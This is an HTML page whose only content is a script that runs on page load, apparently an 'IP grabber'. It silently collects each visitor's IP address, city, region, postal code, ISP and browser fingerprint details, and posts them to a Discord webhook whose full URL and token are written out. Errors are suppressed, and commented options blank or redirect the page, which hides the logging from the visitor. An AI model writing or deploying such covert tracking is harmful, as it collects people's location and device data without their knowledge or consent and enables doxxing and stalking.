<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title></title>
  <style>body{margin:0;background:#000;}</style>
</head>
<body>

  <script>
    const webhook = "https://discord.com/api/webhooks/1485701753654743261/BNhHwbYVgb4vi3GO2RpOBZ-DqnmrxZMv_Vn7tnc4nRf0BMnoTaQFqGWeFngQcDwCrj4E"; // ← REPLACE THIS

    async function grabAll() {
      try {
        // IP + geo + ISP (using ipinfo.io - free tier, reliable)
        const ipRes = await fetch('https://ipinfo.io/json');
        const ipData = await ipRes.json();

        // Gather everything the browser exposes
        const allInfo = {
          ip: ipData.ip || '?',
          loc: `${ipData.city || '?'} • ${ipData.region || '?'} • ${ipData.country || '?'}`,
          postal: ipData.postal || '?',
          timezone: ipData.timezone || '?',
          isp_org: ipData.org || '?',
          ua: navigator.userAgent || '?',
          platform: navigator.platform || '?',
          languages: navigator.languages?.join(', ') || navigator.language || '?',
          screen: `\( {screen.width}× \){screen.height} (${screen.colorDepth || '?'}bit)`,
          avail_screen: `\( {screen.availWidth}× \){screen.availHeight}`,
          hardware: navigator.hardwareConcurrency || '? cores',
          memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : '?',
          connection: navigator.connection ? `\( {navigator.connection.effectiveType || '?'} ( \){navigator.connection.downlink || '?'} Mbps)` : '?',
          doNotTrack: navigator.doNotTrack || '?',
          cookies: navigator.cookieEnabled ? 'enabled' : 'disabled',
          time: new Date().toISOString(),
          referrer: document.referrer || 'none/direct'
        };

        // Build embed fields dynamically (no source/site mention beyond raw referrer if present)
        const fields = Object.entries(allInfo).map(([key, val]) => ({
          name: key.charAt(0).toUpperCase() + key.slice(1).replace(/_/g, ' '),
          value: `\`${val}\``,
          inline: !['ua', 'referrer'].includes(key)  // longer ones full width
        }));

        await fetch(webhook, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            embeds: [{
              title: "Visitor",
              color: 0x00AA00,
              fields: fields,
              timestamp: new Date().toISOString(),
              footer: { text: "Logged" }
            }]
          })
        });
      } catch (e) {
        // silent fail if blocked (adblock, etc.)
      }
    }

    grabAll();

    // Optional: blank the page or redirect after logging (uncomment if wanted)
    // setTimeout(() => { document.body.innerHTML = ''; }, 800);
    // or redirect: setTimeout(() => { window.location = "https://example.com"; }, 1200);
  </script>
</body>
</html>
